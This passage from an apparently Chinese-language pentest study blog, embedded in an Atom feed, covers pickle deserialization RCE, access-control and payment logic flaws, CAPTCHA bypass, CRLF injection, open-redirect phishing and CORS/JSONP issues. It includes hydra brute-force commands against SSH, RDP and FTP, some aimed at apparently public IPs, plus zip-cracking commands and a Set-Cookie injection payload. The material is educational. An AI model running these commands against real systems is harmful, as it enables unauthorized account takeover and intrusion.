class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;魔术方法 __getstate__() 的使用举例：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class A(object):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def __getstate__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;#x27; 序列化调用 &amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    os.system(&amp;#x27;calc&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = A()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_a = pickle.dumps(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;#x27;==========&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(p_a)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;mac上弹计算器的命令open /System/Applications/Calculator.app ，win则是calc&lt;/code&gt; &lt;br&gt;
 &lt;code&gt; 反弹shell的命令见 https://forum.ywhack.com/shell.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（2）python 由反序列化漏洞反弹 shell：&lt;/p&gt;
&lt;p&gt;服务器有可以接收序列化对象的内容并且会执行这串序列化内容，一般这 个序列化数据会经过加密，有可能是采用的普通的 base64 加密，寻找到可以传 输序列化数据的地方并且了解此内容是如何执行相关代码的。伪造序列化后的 数据载入反弹 shell 的代码，再次进行加密，放入到能够使对方执行这串序列化 数据的位置。&lt;/p&gt;
&lt;p&gt;python 代码审计工具 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1B5Q1FBL2JhbmRpdA==&#34;&gt;https://github.com/PyCQA/bandit&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;业务逻辑漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#业务逻辑漏洞&#34;&gt;#&lt;/a&gt; 业务逻辑漏洞&lt;/h3&gt;
&lt;h4 id=&#34;逻辑越权-访问控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#逻辑越权-访问控制&#34;&gt;#&lt;/a&gt; 逻辑越权 访问控制&lt;/h4&gt;
&lt;p&gt;（1）逻辑越权：&lt;/p&gt;
&lt;p&gt;水平越权：用普通用户 A 去登陆普通用户 B，对方在后台数据库做的验证不严谨，可通过篡改数据库疑似权限编号；可用修改用户 A 的数据时抓包将修 改的信息改成用户 B，漏洞产生的原因是代码中将用户写成了一个动态的数据。&lt;/p&gt;
&lt;p&gt;垂直越权：用普通用户操作管理员的权限，需要去得到管理员添加用户的数据包，管理员退出后其 session 会失效，如果可以得到管理员的数据包，将普通用户的数据包中 session 给换上，尝试是否存在有管理员的权限。&lt;/p&gt;
&lt;p&gt;（2）访问控制：&lt;/p&gt;
&lt;p&gt;验证是存在的，但是逻辑出现问题导致此验证没有真正被利用；也有可能是验证是可以被一些匿名用户或者白名单用户触发后绕过。若验证方式如 cookie/jwt/token/session 这些身份认证凭据是脆弱验证，逻辑性不强导致被绕过。&lt;/p&gt;
&lt;p&gt;实际测试中就是去抓包改改参数，看看有没有可能以改变参数的方式修改当前权限。&lt;/p&gt;
&lt;h4 id=&#34;支付流程及验证失效&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#支付流程及验证失效&#34;&gt;#&lt;/a&gt; 支付流程及验证失效&lt;/h4&gt;
&lt;p&gt;（1）支付流程问题&lt;/p&gt;
&lt;p&gt;常见支付流程：选择商品和数量、选择支付及配送方式、生成订单编号、订单支付选择、完成支付；熟悉数据篡改：商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等；熟悉修改方式：替换支付，重复支付，最小 额支付，负数支付，溢出支付，优惠券支付等。&lt;/p&gt;
&lt;p&gt;（2）支付流程问题举例&lt;/p&gt;
&lt;p&gt;如产品价格未被固定，可以通过数据包中修改产品价格；如修改产品数量为 - 1，从 而改变产品价格；用低价格的产品中的数据包去买高价格的产品；修改优惠券额度。&lt;/p&gt;
&lt;p&gt;关键就是找到数据包中没有被固定好的地方，抓取此数据包并进行修改。或者抓取不通价格、不同产品的物品进行数据包的观察与测试。这些数据应该从数据库中取，而不是以前端用数据包发送可以修改的数据为准。&lt;/p&gt;
&lt;p&gt;（2）验证码识别：&lt;/p&gt;
&lt;p&gt;验证码是否能够爆破、是否能够重复使用以上一次的验证码来识别本次的识别码；&lt;/p&gt;
&lt;p&gt;找回密码如果根据返回状态来判断验证是否正确可以抓取返回包进行绕过；&lt;/p&gt;
&lt;p&gt;先通过验证，再最后一步的时候将验证的对象改为另一用户尝试；&lt;/p&gt;
&lt;p&gt;如果验证码是从数据包中传输的，可以尝试从数据包中寻找验证码。&lt;/p&gt;
&lt;p&gt;验证码爆破插件推荐 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NteGlhemkvTkVXX3hwX0NBUFRDSEE=&#34;&gt;https://github.com/smxiazi/NEW_xp_CAPTCHA&lt;/span&gt; , 可以解决爆破用户的时候验证码一直在改变的问题，burp 插件验证码识别 xp_CAPTCHA&lt;/p&gt;
&lt;p&gt;使用参考地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9wdW5pc2hlZC9wLzE0NzQ2OTcwLmh0bWw=&#34;&gt;http://www.cnblogs.com/punished/p/14746970.html&lt;/span&gt; burp 中通过使用扩展加载此插件。免费版的识别成功率不高，需要多爆破几次。&lt;/p&gt;
&lt;p&gt;（3）验证码安全修复：&lt;/p&gt;
&lt;p&gt;找回机制要进行每一步验证 - 防绕过重定向、找回机制要进行服务端验证 - 防 res 数据修改、找回机制要控制验证码安全 - 防验证码攻击、验证码接口需验证后被调用 - 防接口被乱调用、验证码引用智能化人工判断 - 防验证码被识别、验 证码采用时间段生效失效 - 防验证码被复用。&lt;/p&gt;
&lt;h4 id=&#34;弱口令爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#弱口令爆破&#34;&gt;#&lt;/a&gt; 弱口令爆破&lt;/h4&gt;
&lt;p&gt;（1）弱口令爆破：&lt;/p&gt;
&lt;p&gt;没有严格和准确的定义，通常认为容易被别猜测到或被破解工具破解的口令均为弱口令，通常与管理的安全意识和平台的初始化配置等相关，通过系统弱口令，可被黑客直接获得系统控制权限。&lt;/p&gt;
&lt;p&gt;在常见的安全测试中，弱口令会产生安全的各个领域，包括 Web 应用，安全设备，平台组件，操作系统等；如何获取弱口令，利用弱口令成为了此类安全问题的关键。&lt;/p&gt;
&lt;p&gt;弱口令通过 burp 爆破时需要提前观察密码是否被 hash 加密，如果是则需要进行配置&lt;/p&gt;
&lt;p&gt;（2）弱口令相关的链接：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;电子邮箱泄漏信息查询地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://monitor.firefox.com/scan、https://haveibeenpwned.com/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用人的密码习惯,精准分析密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.bugku.com/mima/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;经典密码字典合集&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;多个来源收集的默认登录名/密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/ihebski/DefaultCreds-cheat-sheet&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（3）hydra 弱口令爆破：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-l 指定用户guest ，-P 指定字典 ，-f 爆破密码成功后停止&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-vV 显示详细过程 - o将爆破成功信息保存到文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;字典推荐：https://github.com/TheKingOfDuck/fuzzDicts&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -l guest -P pass.dic ssh://192.168.31.107 -f -t 4 -I -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form &amp;quot;/:username=^USER^&amp;amp;password^PASS^:Invalid username.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.31.25 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -l administrator -P UserPassCombo-Jay.txt -t 5 -vV 47.99.218.105 rdp -f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（4）zip 文件解密：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解密文件受字典的限制，也可以寻找一些比较好一点的字典测试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip2join sshpass.zip &amp;gt; ssh.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;其他漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他漏洞&#34;&gt;#&lt;/a&gt; 其他漏洞&lt;/h3&gt;
&lt;h4 id=&#34;crlf-回车换行漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crlf-回车换行漏洞&#34;&gt;#&lt;/a&gt; CRLF 回车换行漏洞&lt;/h4&gt;
&lt;p&gt;（1）CRLF 注入漏洞：&lt;/p&gt;
&lt;p&gt;是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一些恶 意字符。攻击者一旦向请求行或首部中的字段注入恶意的 CRLF，就能注入一 些首部字段或报文主体，并在响应中输出，所以又称为 HTTP 响应拆分漏洞。 可造成的影响很低。&lt;/p&gt;
&lt;p&gt;vulhub 复现：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L2luc2VjdXJlLWNvbmZpZ3VyYXRpb24v&#34;&gt;https://vulhub.org/#/environments/nginx/insecure-configuration/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Payload: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3lvdXItaXA6ODA4MC8lMGElMGRTZXQtQ29va2llOiUyMGE9MSVFRiVCQyU4QyVFNSU4RiVBRiVFNiVCMyVBOCVFNSU4NSVBNVNldC1Db29raWUlRTUlQTQlQjQlRTMlODAlODI=&#34;&gt;http://your-ip:8080/
Set-Cookie: a=1，可注入 Set-Cookie 头。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（2）CRLF 漏洞利用：&lt;/p&gt;
&lt;p&gt;访问特定的 url 地址时，返回数据包中的头部被改变；是一种换行回车漏洞， 可尝试访问某些 url 地址时，改变返回的数据包；与 xss 漏洞配合，让对方去访 问自己构造的 url，实现 xss 盗取 cookie; 用自动化工具 CRLFuzz 来自动检测对 方是否存在此漏洞。&lt;/p&gt;
&lt;p&gt;CRLFFuzz：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2R3aXNpc3dhbnQwL2NybGZ1eno=&#34;&gt;https://github.com/dwisiswant0/crlfuzz&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;url-重定向&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#url-重定向&#34;&gt;#&lt;/a&gt; url 重定向&lt;/h4&gt;
&lt;p&gt;（1）URL 重定向跳转&lt;/p&gt;
&lt;p&gt;网站接受用户输入的链接后会进行跳转到另一个地址，本来是用来加载一 些资源文件的，但是由于过滤不严谨是可以直接跳转到一些页面的。而这个地址可以人为的指定，可以配合钓鱼攻击，可以先另存原始 login 页面，在发至自 己的服务器，进行修改，获取对方提交的用户名和密码。&lt;/p&gt;
&lt;p&gt;拉取到对方源码进行伪造后，需要进行一些修改，将对方 html 界面的数据通过 ajax 或者其他方式将 user、pass 的值发送到自己的服务器上，进行钓鱼攻击。&lt;/p&gt;
&lt;h4 id=&#34;web-拒绝服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web-拒绝服务&#34;&gt;#&lt;/a&gt; Web 拒绝服务&lt;/h4&gt;
&lt;p&gt;现在有许多资源是由服务器生成然后返回给客户端的，而此类 “资源生成” 接口如若有参数可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风险，导致服务器处理不过来或占用资源去处理。&lt;/p&gt;
&lt;p&gt;比如有一个无限大小的 zip 文件，如果对方自动进行解压，就会无限占用对方的资源，导致 CPU 占满，网站崩溃。又比如没有做限制的修改图片的尺寸，占用了服务器的资源。&lt;/p&gt;
&lt;h4 id=&#34;同源策略&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#同源策略&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h4&gt;
&lt;p&gt;同源包括三个条件：同协议、同域名、同端口。&lt;/p&gt;
&lt;p&gt;同源策略限制从一个源加载的文档或脚本与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的关键的安全机制。简单说就是浏览器的一种安全策略。&lt;/p&gt;
&lt;p&gt;虽然同源策略在安全方面起到了很好的防护作用，但也在一定程度上限制了一些前端功能的实现，所以就有了许多跨域的手段。&lt;/p&gt;
&lt;h4 id=&#34;cosp跨域资源&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosp跨域资源&#34;&gt;#&lt;/a&gt; COSP 跨域资源&lt;/h4&gt;
&lt;p&gt;CORS 全称 Cross-Origin Resource Sharing, 跨域资源共享，是 HTML5 的一 个新特性，已被所有浏览器支持，跨域资源共享 (CORS) 是一种放宽同源策略的 机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据。&lt;/p&gt;
&lt;p&gt;Access-Control-Allow-Origin: 指定哪些域可以访问域资源。寻找此漏洞是 看设置问题，是否通过这个字段来获取资源。&lt;/p&gt;
&lt;p&gt;检测项目：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NoZW5qai9DT1JTY2FubmVy&#34;&gt;https://github.com/chenjj/CORScanner&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;COSP 危害：敏感页面源码获取&lt;/p&gt;
&lt;p&gt;管理员访问页面跨域调用 URL、受害者访问当前页面被资源共享。漏洞产生的原因是同源策略防护下配置不当导致，漏洞可以导致用户访问的 URL 上的资源丢失。&lt;/p&gt;
&lt;h4 id=&#34;jsonp-跨域回调&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jsonp-跨域回调&#34;&gt;#&lt;/a&gt; jsonp 跨域回调&lt;/h4&gt;
&lt;p&gt;JSONP 跨域巧妙的利用了 script 标签能跨域的特点，实现了 json 的跨域传输。 手动访问某网站，查看 callback 信息，看有无回调中有敏感信息，如果有的回调信息中有存储，可以自己构造 html 界面，让此 html 界面去访问回调信息并本 地存储。&lt;/p&gt;
&lt;p&gt;漏洞产生的原因是同源策略下引用资源回调导致，漏洞可以导致用户访问的 URL 回调接口个人敏感信息丢失。&lt;/p&gt;
&lt;p&gt;手工审查元素筛选或 Burp 项目 https://github.com/p1g3/JSONP-Hunter&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
</feed>
